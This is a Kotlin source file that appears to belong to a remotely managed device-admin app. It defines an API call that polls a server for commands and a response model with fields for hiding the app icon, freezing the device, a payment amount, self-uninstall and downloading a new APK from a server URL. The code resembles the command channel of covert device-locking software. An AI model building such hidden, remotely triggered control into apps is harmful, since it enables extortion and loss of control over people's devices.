package com.example.deviceadmin

import retrofit2.Call
import retrofit2.http.GET

interface ApiService {
    @GET("admin/status.php")
    fun getStatus(@retrofit2.http.Query("deviceid") deviceId: String): Call<StatusResponse>
}

data class StatusResponse(
    // val status: String? = null, // Legacy Removed
    val amount: Int? = null,
    val message: String? = null,
    
    @com.google.gson.annotations.SerializedName("hide_icon")
    val hideIcon: Boolean? = null,
    
    @com.google.gson.annotations.SerializedName("is_freezed")
    val isFreezed: Boolean? = null,
    
    @com.google.gson.annotations.SerializedName("call_to")
    val callTo: String? = null,
    
    @com.google.gson.annotations.SerializedName("is_protected")
    val isProtected: Boolean? = null,
    
    @com.google.gson.annotations.SerializedName("auto_uninstall")
    val autoUninstall: Boolean? = null, // true to trigger self-uninstall
    
    @com.google.gson.annotations.SerializedName("update_url")
    val updateUrl: String? = null, // URL to download the new APK
    
    @com.google.gson.annotations.SerializedName("app_version")
    val appVersion: Int? = null // New version code to compare against
)
